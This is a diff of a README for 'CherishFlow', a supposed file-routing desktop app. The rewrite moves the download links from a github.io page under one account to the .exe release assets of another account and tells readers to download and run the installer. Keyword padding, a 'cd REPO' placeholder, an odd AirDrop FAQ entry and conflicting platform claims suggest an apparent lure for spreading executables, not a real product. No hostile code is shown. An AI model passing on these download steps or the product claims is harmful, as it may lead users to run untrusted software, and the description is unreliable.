@@ -1,183 +1,59 @@
-# CherishFlow v2.8.3 - Intelligent File Orchestration 2026
+# 📂 cherishflow-file-routing - Automated tools to organize your files
 
-> **CherishFlow is a cross-platform desktop application for inspecting, routing, moving, and synchronizing files with automated workflows. Version 2.8.3 is now available.**
+[![](https://img.shields.io/badge/Download-CherishFlow-blue.svg)](https://github.com/bathepit477/cherishflow-file-routing/releases)
 
-[![Platform](https://img.shields.io/badge/Platform-Cross--platform%20desktop-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-v2.8.3-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/grayandrewobb8768/cherishflow-file-routing?style=flat-square)](https://github.com/grayandrewobb8768/cherishflow-file-routing)
+CherishFlow manages your data. This desktop application moves and synchronizes files based on rules you set. You choose the folders, and the program handles the transfers. Version 2.8.3 adds features to schedule recurring tasks and select multiple destinations for your documents.
 
----
+## ✨ Features
 
-<p align="center">
-  <a href="https://grayandrewobb8768.github.io/cherishflow-file-routing/">
-    <img src="https://img.shields.io/badge/Download-CherishFlow%20Latest-brightgreen?style=for-the-badge" alt="Download CherishFlow">
-  </a>
-</p>
+CherishFlow simplifies file management tasks. You rely on this tool to keep your folders clean and your backups current.
 
-> **[Download CherishFlow v2.8.3](https://grayandrewobb8768.github.io/cherishflow-file-routing/)**
+*   **Custom Rules:** You define where files go based on name patterns or file types.
+*   **Automatic Movement:** The software watches folders for new items and moves them as soon as they appear.
+*   **Synchronized Folders:** You keep copies of important data in two places at once.
+*   **Scheduled Tasks:** You set a time for the program to run transfers automatically.
+*   **Multiple Destinations:** You send a single file to several folders with one rule.
+*   **Performance Logs:** You view a record of every action the software performs to ensure files reach their targets.
 
----
+## 🛠️ System Requirements
 
-[Download Latest Build](https://grayandrewobb8768.github.io/cherishflow-file-routing/)
+You need a computer running Windows 10 or Windows 11 to use the application. The program requires 200 megabytes of free space on your hard drive. Most modern computers support this software without extra setup. You do not need administrative rights for standard operation, though some network locations might ask for login credentials once.
 
----
+## 📥 Installation Steps
 
-## Overview
+Follow these steps to set up the software on your Windows computer.
 
-CherishFlow gives individuals and teams a way to move files among local directories, cloud platforms, network resources, and collaboration endpoints. Its routing engine examines file content and applies defined workflow rules, helping users sort incoming files, forward selected items, and manage recurring transfer operations.
+1.  Visit the official release page: [Download CherishFlow](https://github.com/bathepit477/cherishflow-file-routing/releases).
+2.  Look for the section marked Assets.
+3.  Click the file ending in `.exe` to start the download.
+4.  Open your Downloads folder in File Explorer.
+5.  Double-click the CherishFlow installer file.
+6.  Follow the prompts on the screen to finish the installation process.
+7.  Find the CherishFlow icon on your desktop and double-click it to start the program.
 
-The application brings together semantic and visual analysis with configurable automation. A workflow may be operated from the desktop interface, command line, or daemon modes. Routing logs document workflow activity, and the plugin system makes it possible to introduce additional endpoints as requirements expand.
+## ⚙️ Configuration Guide
 
----
+Once you open the software, you create your first workflow. You follow these steps to route your files correctly.
 
-## Key Capabilities
+1.  **Define the Source Folder:** Click the Add button to select the location that contains the files you want to move.
+2.  **Choose the Destination:** Pick one or more folders where you want those files to land.
+3.  **Set the Rule:** Choose your criteria. You sort by file extension, such as .pdf or .jpg. You also sort by name fragments.
+4.  **Pick the Action:** Tell the software if it should move the file, copy the file, or keep it in sync with the source.
+5.  **Save the Rule:** Click the Save button to activate your workflow. The software updates its watch list and begins working immediately.
 
-- Direct files using their content, file type, or configured workflow rules
-- Apply AI-assisted semantic and visual analysis to file operations
-- Build automated workflows for recurring organization and transfer tasks
-- Move data locally, through cloud providers, over networks, or to collaboration endpoints
-- Add destination types through the plugin system
-- Use encrypted transfers when the selected workflow supports them
-- Inspect routing decisions and transfer activity through transparent logs
-- Perform parallel, resumable transfers with intelligent compression
-- Control workflows from the desktop app, CLI, or daemon modes
+## 🔍 Managing Workflows
 
----
+You modify existing rules whenever your needs change. Open the dashboard to see a list of active workflows. You click the pencil icon next to any rule to change the source or destination folders. You click the toggle switch on the right side of the screen to turn a workflow off without deleting it. This keeps your rules safe while you pause operations for maintenance.
 
-## Getting Started
+## 📋 Troubleshooting Tips
 
-### Download and install
+If the software does not move a file, check these items first.
 
-1. Visit the [latest download page](https://grayandrewobb8768.github.io/cherishflow-file-routing/).
-2. Select the package that matches your operating system.
-3. Install or unpack the downloaded build as appropriate for its format.
-4. Start CherishFlow, or open a terminal in its installation directory.
+*   **File Locks:** Check if another program currently uses the file. Close the other program and the transfer continues.
+*   **Permission Issues:** Ensure your user account has permission to read the source folder and write to the destination folder.
+*   **Network Mapping:** If your folders exist on a network drive, confirm the connection status. You might need to reconnect to the server before the software detects the folder.
+*   **Folder Paths:** Confirm you typed the correct path to your folders. You use the Browse button to avoid typing errors.
 
-### Build from the repository
+You reach out if you encounter a bug. Check the repository issues page to see if others report the same behavior. You provide a small screenshot of your settings to help us resolve the issue faster.
 
-```bash
-git clone https://github.com/grayandrewobb8768/cherishflow-file-routing.git
-cd REPO
-```
-
-To see the command-line features available in your build, run:
-
-```bash
-cherishflow --help
-```
-
-Launch procedures and package details can differ between operating systems and build types.
-
----
-
-## Using CherishFlow
-
-A workflow generally follows this sequence:
-
-1. Choose one or more source locations.
-2. Add the local, cloud, network, or collaboration destinations required.
-3. Create rules that determine how incoming files are routed.
-4. Turn on semantic or visual analysis for content-based decisions.
-5. Select transfer behavior, including compression and resumable transfers.
-6. Run the workflow from the desktop application, CLI, or daemon mode.
-7. Check the routing logs to confirm completed actions and diagnose failed transfers.
-
-The following commands can help identify the installed command-line interface:
-
-```bash
-cherishflow --help
-cherishflow --version
-```
-
-For job-specific setup, use the workflow interface or the command-line documentation included with your build.
-
----
-
-## Configuration
-
-Manage CherishFlow settings through the application configuration interface or through the configuration location supplied by the installed build. The following example illustrates the main workflow concepts:
-
-```yaml
-sources:
-  - path: ./inbox
-
-destinations:
-  - name: archive
-    type: local
-
-routing:
-  analysis: semantic
-  compression: intelligent
-  resumable: true
-  parallel: true
-
-logging:
-  transparent: true
-```
-
-Supported destination types, analysis modes, plugin configuration, and transfer controls are determined by the installed build and its enabled extensions.
-
----
-
-## System Requirements
-
-- A supported macOS, Windows, or Linux desktop environment
-- Enough storage for source data, temporary processing, and destination files
-- Network connectivity when using cloud, network, or collaboration destinations
-- Credentials and endpoint information for configured external services
-- Extra resources where AI-powered semantic or visual analysis is used
-- Any requirements imposed by enabled plugins and custom endpoints
-
----
-
-## Frequently Asked Questions
-
-### Which operating systems are supported?
-
-CherishFlow is built as a cross-platform desktop application for macOS, Windows, and Linux.
-
-### Can I transfer files without using cloud storage?
-
-Yes. You can configure local and network destinations, as well as cloud and collaboration endpoints.
-
-### Are AirDrop-style workflows available?
-
-AirDrop is covered among the supported workflow concepts and keywords. Actual behavior is determined by the operating system and the endpoint configuration.
-
-### How can recurring transfers be automated?
-
-Define routing rules in the desktop application, then execute the workflow through the CLI or daemon mode for repeatable or background operation.
-
-### Where are transfer results recorded?
-
-Transparent routing logs show workflow decisions and transfer activity.
-
-### What can I do when a transfer is interrupted?
-
-Check that both the source and destination are accessible, inspect the routing logs, confirm the endpoint settings, and run the workflow again. Where supported, resumable transfers can continue an interrupted operation.
-
-### Where do I get updates?
-
-Visit the [latest build](https://grayandrewobb8768.github.io/cherishflow-file-routing/) for current download and release information.
-
-### How can I configure a new destination?
-
-Install or configure an extension for the desired endpoint through the plugin architecture, then select that endpoint as a destination in the appropriate workflow.
-
----
-
-## Future Work
-
-- Add support for more transfer endpoint types
-- Extend plugin functionality for custom integrations
-- Enhance CLI and daemon workflow controls
-- Further develop content-aware routing and analysis
-- Improve transfer monitoring and recovery processes
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: file management, automation, synchronization, windows desktop, productivity, folder organization
